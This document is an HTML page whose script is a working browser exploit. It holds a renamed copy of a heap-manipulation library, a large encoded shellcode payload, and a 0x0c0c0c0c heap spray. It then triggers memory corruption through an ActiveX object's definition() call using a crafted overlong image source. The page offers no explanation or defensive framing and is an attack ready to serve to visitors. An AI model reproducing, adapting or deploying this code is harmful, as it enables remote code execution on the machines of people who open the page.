<html>
<head>
<script>


function hl1() {
}



hl1.io = function(max1, hb1) {

    this.max1 = (max1 ? max1 : 65535);
    this.hb1 = (hb1 ? hb1 : 0x150000);

    
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.max1) {
        this.paddingStr += this.paddingStr;
    }
    
    
    this.mem = new Array();

    
    this.flushOleaut32();
}




hl1.io.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


hl1.io.prototype.debughap1 = function(enable) {

    if (enable == true)
     {   void(Math.atan(0xbabe));}
    else
     {   void(Math.asin(0xbabe));}
}



hl1.io.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}



hl1.io.prototype.padding = function(len) {
    if (len > this.paddingStr.length) {
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";
}
    return this.paddingStr.substr(0, len);
}



hl1.io.prototype.round = function(num, round) {
    if (round == 0)
      {  throw "Round argument cannot be 0";}

    return parseInt((num + (round-1)) / round) * round;
}




hl1.io.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
     {   hex = "0" + hex;}

    return hex;
}




hl1.io.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}



hl1.io.prototype.alac1Oleaut32 = function(arg, tag) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
      {  size = 4 + arg.length*2 + 2;    }
    else
     {   size = arg;}

    
    if ((size & 0xf) != 0)
       { throw "Allocation size " + size + " must be a multiple of 16";}

    
    if (this.mem[tag] === undefined)
       { this.mem[tag] = new Array();}

    if (typeof arg == "string" || arg instanceof String) {
        
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}




hl1.io.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    
    CollectGarbage();
}




hl1.io.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    this.freeOleaut32("oleaut32");
    
    

    for (var i = 0; i < 6; i++) {
        this.alac1Oleaut32(32, "oleaut32");
        this.alac1Oleaut32(64, "oleaut32");
        this.alac1Oleaut32(256, "oleaut32");
        this.alac1Oleaut32(32768, "oleaut32");
    }
}




hl1.io.prototype.alac1 = function(arg, tag) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
     {   size = 4 + arg.length*2 + 2;  }  
    else
     {   size = arg;}

    
    if (size == 32 || size == 64 || size == 256 || size == 32768)
      {  throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";}

    
    this.alac1Oleaut32(arg, tag);
}




hl1.io.prototype.free = function(tag) {

    
    this.freeOleaut32(tag);

    
    this.flushOleaut32();
}



hl1.io.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}



hl1.io.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alac1(arg);
        this.alac1(arg, "freeList");
    }
    this.alac1(arg);

    this.free("freeList");
}



hl1.io.prototype.lookaside = function(arg, count) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
     {   size = 4 + arg.length*2 + 2;    }
    else
    {    size = arg;}

    
    if ((size & 0xf) != 0)
     {   throw "Allocation size " + size + " must be a multiple of 16";}

    if (size+8 >= 1024)
       { throw("Maximum lookaside block size is 1008 bytes");}

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
     {   this.alac1(arg, "lookaside");}

    this.free("lookaside");
}




hl1.io.prototype.lookasideAddr = function(arg)
{
    var size;

    
    if (typeof arg == "string" || arg instanceof String)
     {   size = 4 + arg.length*2 + 2;    }
    else
     {   size = arg;}

    
    if ((size & 0xf) != 0)
     {   throw "Allocation size " + size + " must be a multiple of 16";}

    if (size+8 >= 1024)
    {    throw("Maximum lookaside block size is 1008 bytes");}

    
    return this.hb1 + 0x688 + ((size+8)/8)*48;
}



hl1.io.prototype.vtable = function(shc1, jmpecx, size) {

    var size = (size ? size : 1008);

    
    if ((size & 0xf) != 0)
     {   throw "Vtable size " + size + " must be a multiple of 16";}

    if (shc1.length*2 > size-138)
     {   throw("Maximum shc1 length is " + (size-138) + " bytes");}

    
    var vtable = unescape("%u9090%u7ceb")   

    for (var i = 0; i < 124/4; i++)
      {  vtable += this.addr(jmpecx);}

    
    vtable += unescape("%u0028%u0028") +    
              shc1 + hap1.padding((size-138)/2 - shc1.length);

    return vtable;
}

var hap1_obj = new hl1.io(0x20000);
var cd13 = unescape("%u9742%u08b4%ue2f7%u2c35%ue18c%uf51b%ub2b7%u4b4f%u770d%u717e%u091c%u41e3%u043c%u9290%u2abf%u78e0%u3148%ub8d6%u247a%u7499%ud211%ub6d5%u3734%u3fbe%ua92f%u1d40%uf883%u3d7b%u4a67%u8db9%u4996%u0cba%ud438%u75b1%uf903%u159f%u277e%u8d98%u7c75%u1c7a%u4e79%ua8a9%uf689%u78e2%u934a%ub625%ufc18%ube46%uf921%u3c77%u2db8%u9742%u1d9b%u872c%u2bd6%u3ff8%u41b9%u714f%u2349%u35f5%ufd22%ud502%u19b4%u32e0%u01e1%u73e3%u7d4b%u6605%u0db7%u3774%u1a24%u76eb%u9814%u7b7f%u040c%u90b0%u4315%u9947%u6772%ud40a%ub540%ub1bf%u70bb%ub348%u963d%u3492%u9f2f%u7473%u7775%uba27%u91b2%u84b0%ue0d1%u497f%u3db1%ueb81%u7670%u2d71%u3f3c%u7c93%u4a79%uf580%ubebb%ub697%u7d15%u0b37%uc7ff%uc1c6%ub2f8%u7b92%ufd3b%u7aa8%u4e1c%u3a7e%u4fe3%u351d%ub88d%ub396%u1341%uc0fe%u42d5%u7840%u302c%u9bfc%u86b7%u34e1%u6604%u9fb5%u67bf%u1443%u6998%u47d6%u4691%ub4b9%u4824%uf985%u2790%uba99%ud46b%u050c%ua925%ue220%u0d2f%u4b72%u7d96%u4f3f%u7ab8%u9b67%u4827%u7e4e%u0478%u79b6%ue139%u9335%u757b%u4172%u124a%u88f5%ud0d3%u49fd%ue029%u7176%u0d77%u978d%u922c%u4bb9%u0591%u15ba%u99b3%u0c37%u3373%u66fc%uf901%ue211%u2f74%ub290%ub047%ud528%u9fbf%u3d7f%ua940%u4670%u7c1d%u4225%ub798%u2db1%u3ca8%u30b4%u14eb%ud480%ud087%u8cd6%u34e3%u3a24%uf8d3%ub5be%u43bb%u0a1c%u79fd%ue028%u1076%u97f5%u18b5%u08e1%u2fe3%u9342%ub966%u677b%u1db6%ub44f%uf820%ueb85%u7c27%ud42a%ub2bf%u7271%ud119%u2de2%u759b%u743d%ub025%u3f91%ua9ba%u9647%u707d%u4648%ube40%u981c%u73b8%u9f4b%u4a7a%u4143%u92bb%ua83c%u77b7%u2c7e%u0535%u0499%u6b78%u24d5%u154e%u8937%u8df9%u3490%ub349%ufc33%u0d7f%ub10c%u7114%u2979%u92d6%u7cb2%uc003%u0de0%uf983%u2177%u12e3%ue1f6%u7527%u9647%ub04b%u4f7d%ub63c%u3843%u04fc%u4eb5%u749b%u4142%u7a98%ubf48%u8437%u78d5%u2470%u3d73%ub849%u76ba%u1d72%u1c7f%u0b8d%u7bfd%ueb1a%u1546%ua83f%ube34%u909f%ub767%uf709%u2ce2%u147e%ua997%ub32d%uf881%u934a%ud469%u35bb%ue031%uc122%u2feb%u257e%u0c7a%u78b1%u7640%ud613%u99b9%u7291%u6605%u71b4%uf539%u0d7c%u3274%ubffd%u77b7%u751d%u8627%ub9d5%u3b73%u2fe3%u027d%u79d4%u7b41%u9914%ue242%ub205%u347f%u988d%ub5b1%uba9f%u700c%ud22b%u1be1%u4bf8%u96b3%u23a9%u40f9%u4643%ube93%ud692%u2d97%ub866%u3f91%u4804%ub4bb%uf59b%u473c%u2415%ua849%u4fb0%u4eb6%u3567%u881c%u25fc%u2c3d%u4a37%ub890%u1698%u2a39%ucbda%u74d9%uf424%u315b%ub1c9%u3149%u1443%u4303%u8314%u04c3%ue37a%uc2c5%u0cf3%u1336%u8463%u22d3%uf2b1%u1790%u7005%u9bf4%ud4ee%u28ed%uf082%u9802%u2728%u192c%ue79d%ud9e2%u9bbc%u0df8%ua51e%u4032%ue25f%uab2f%ubb0d%u1e24%uc8a1%ua379%u1ec0%u9bf6%u1bba%u68c9%u2570%uc01a%u6d0f%u6a82%u4e57%ubfb3%ub284%ub4fa%u407e%u1cfd%ua94f%u60cf%u9403%u6cff%ud05a%u8f38%u2a29%u323b%ue929%ue841%uecbc%u7be2%ud566%uaf13%u9ef0%u0418%uf877%u9b3c%u7254%u1038%u555b%u62c8%u717f%u3190%u201e%u977c%u321f%u48d8%u3885%u9dcb%u62bf%u5284%u9c8d%ufd54%uef86%ua266%u783c%u2bcb%u7f9a%u062c%uef5a%ua9d3%u399a%ufd10%u51ca%u7eb1%ua181%uab3e%uf205%u0490%ua2e5%uf550%ua88d%u2a5e%ud2ad%u43b4%u2847%uac5f%u333f%u44f8%u343d%u2e07%ud2c8%u406d%u4d9c%uf91a%u0685%u06bb%u6310%u8dfb%u9396%u65b2%u87d3%u8623%ufaae%u99e2%u9005%u0c0a%u33a1%ub85c%u62ab%u67aa%u4154%uaea0%u2ac0%ucedf%uab04%u991f%uab4e%u7d77%uf82a%u8262%u6ce7%u173f%uc507%ub093%ueb6f%uf7ca%u1430%u0639%uc30d%u8c04%u6167%u4c65");
var nap12 = unescape("%u0c0c%u0c0c");

while (nap12.length < 0x80000){ nap12 += nap12;}

var ofi1 = nap12.substring(0, 0x100);
var shc1 = ofi1 + cd13 + nap12.substring(0, 0x800-cd13.length-ofi1.length);

while (shc1.length < 0x40000){ shc1 += shc1;}
var block = shc1.substring(0, (0x80000-6)/2);


hap1_obj.gc();
for (var z=1; z < 0x230; z++) {
	hap1_obj.alac1(block);
}


</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="YRpw"></object>
<script>
var obj = document.getElementById('YRpw').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(245);
</script>
</body>
</html>
